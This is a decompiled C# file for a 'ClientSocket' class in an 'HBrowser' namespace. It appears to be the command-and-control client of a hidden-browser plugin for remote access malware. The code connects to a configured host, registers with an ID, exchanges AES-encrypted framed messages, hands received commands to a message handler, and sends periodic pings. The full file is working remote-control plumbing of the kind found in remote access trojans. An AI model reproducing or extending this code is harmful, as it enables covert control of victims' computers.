using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace HBrowser
{
	// Token: 0x02000008 RID: 8
	public class ClientSocket
	{
		// Token: 0x06000027 RID: 39 RVA: 0x000031B0 File Offset: 0x000013B0
		public static void BeginConnect()
		{
			ClientSocket.S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
			ClientSocket.BufferLength = -1L;
			ClientSocket.Buffer = new byte[1];
			ClientSocket.MS = new MemoryStream();
			ClientSocket.S.ReceiveBufferSize = 51200;
			ClientSocket.S.SendBufferSize = 51200;
			try
			{
				ClientSocket.S.Connect(Settings.Host, Conversions.ToInteger(Settings.Port));
				ClientSocket.isConnected = true;
				ClientSocket.Send("FormHBrowser" + Settings.SPL + Settings.IDD);
				ClientSocket.S.BeginReceive(ClientSocket.Buffer, 0, ClientSocket.Buffer.Length, SocketFlags.None, new AsyncCallback(ClientSocket.BeginReceive), ClientSocket.S);
			}
			catch (Exception ex)
			{
				ClientSocket.isDisconnected();
			}
		}

		// Token: 0x06000028 RID: 40 RVA: 0x0000328C File Offset: 0x0000148C
		public static void BeginReceive(IAsyncResult ar)
		{
			bool flag = !ClientSocket.isConnected;
			if (flag)
			{
				ClientSocket.isDisconnected();
			}
			try
			{
				int num = ClientSocket.S.EndReceive(ar);
				bool flag2 = num > 0;
				if (flag2)
				{
					bool flag3 = ClientSocket.BufferLength == -1L;
					if (flag3)
					{
						bool flag4 = ClientSocket.Buffer[0] == 0;
						if (flag4)
						{
							ClientSocket.BufferLength = Conversions.ToLong(Helper.BS(ClientSocket.MS.ToArray()));
							ClientSocket.MS.Dispose();
							ClientSocket.MS = new MemoryStream();
							bool flag5 = ClientSocket.BufferLength == 0L;
							if (flag5)
							{
								ClientSocket.BufferLength = -1L;
								ClientSocket.S.BeginReceive(ClientSocket.Buffer, 0, ClientSocket.Buffer.Length, SocketFlags.None, new AsyncCallback(ClientSocket.BeginReceive), ClientSocket.S);
								return;
							}
							ClientSocket.Buffer = new byte[(int)(ClientSocket.BufferLength - 1L + 1L)];
						}
						else
						{
							ClientSocket.MS.WriteByte(ClientSocket.Buffer[0]);
						}
					}
					else
					{
						ClientSocket.MS.Write(ClientSocket.Buffer, 0, num);
						bool flag6 = ClientSocket.MS.Length == ClientSocket.BufferLength;
						if (flag6)
						{
							Thread thread = new Thread(new ParameterizedThreadStart(ClientSocket.BeginRead));
							thread.Start(ClientSocket.MS.ToArray());
							ClientSocket.BufferLength = -1L;
							ClientSocket.MS.Dispose();
							ClientSocket.MS = new MemoryStream();
							ClientSocket.Buffer = new byte[1];
						}
						else
						{
							ClientSocket.Buffer = new byte[(int)(ClientSocket.BufferLength - ClientSocket.MS.Length - 1L + 1L)];
						}
					}
					ClientSocket.S.BeginReceive(ClientSocket.Buffer, 0, ClientSocket.Buffer.Length, SocketFlags.None, new AsyncCallback(ClientSocket.BeginReceive), ClientSocket.S);
				}
				else
				{
					ClientSocket.isDisconnected();
				}
			}
			catch (Exception ex)
			{
				ClientSocket.isDisconnected();
			}
		}

		// Token: 0x06000029 RID: 41 RVA: 0x00003490 File Offset: 0x00001690
		public static void BeginRead(object b)
		{
			try
			{
				byte[] b2 = (byte[])b;
				Messages.Read(b2);
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x0600002A RID: 42 RVA: 0x000034D4 File Offset: 0x000016D4
		public static void Send(string msg)
		{
			try
			{
				using (MemoryStream memoryStream = new MemoryStream())
				{
					byte[] array = Helper.AES_Encryptor(Helper.SB(msg));
					byte[] array2 = Helper.SB(array.Length.ToString() + Conversions.ToChar("\0").ToString());
					memoryStream.Write(array2, 0, array2.Length);
					memoryStream.Write(array, 0, array.Length);
					ClientSocket.S.Poll(-1, SelectMode.SelectWrite);
					ClientSocket.S.Send(memoryStream.ToArray(), 0, (int)memoryStream.Length, SocketFlags.None);
				}
			}
			catch (Exception ex)
			{
				ClientSocket.isDisconnected();
			}
		}

		// Token: 0x0600002B RID: 43 RVA: 0x00003598 File Offset: 0x00001798
		public static void isDisconnected()
		{
			ClientSocket.isConnected = false;
			try
			{
				ClientSocket.S.Close();
				ClientSocket.S.Dispose();
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
			try
			{
				ClientSocket.MS.Close();
				ClientSocket.MS.Dispose();
			}
			catch (Exception ex2)
			{
				Debug.WriteLine(ex2.Message);
			}
			try
			{
				Plugin.T1.Abort();
			}
			catch (Exception ex3)
			{
				Debug.WriteLine(ex3.Message);
			}
			try
			{
				Plugin.T2.Abort();
			}
			catch (Exception ex4)
			{
				Debug.WriteLine(ex4.Message);
			}
		}

		// Token: 0x0600002C RID: 44 RVA: 0x0000367C File Offset: 0x0000187C
		public static void Ping()
		{
			for (;;)
			{
				Thread.Sleep(30000);
				try
				{
					bool connected = ClientSocket.S.Connected;
					if (connected)
					{
						using (MemoryStream memoryStream = new MemoryStream())
						{
							byte[] array = Helper.AES_Encryptor(Helper.SB("PING?"));
							byte[] array2 = Helper.SB(array.Length.ToString() + Conversions.ToChar("\0").ToString());
							memoryStream.Write(array2, 0, array2.Length);
							memoryStream.Write(array, 0, array.Length);
							ClientSocket.S.Poll(-1, SelectMode.SelectWrite);
							ClientSocket.S.Send(memoryStream.ToArray(), 0, (int)memoryStream.Length, SocketFlags.None);
							GC.Collect();
						}
					}
				}
				catch (Exception ex)
				{
					ClientSocket.isDisconnected();
				}
			}
		}

		// Token: 0x0400000E RID: 14
		public static bool isConnected = false;

		// Token: 0x0400000F RID: 15
		public static Socket S;

		// Token: 0x04000010 RID: 16
		public static long BufferLength = 0L;

		// Token: 0x04000011 RID: 17
		public static byte[] Buffer;

		// Token: 0x04000012 RID: 18
		public static MemoryStream MS = new MemoryStream();
	}
}
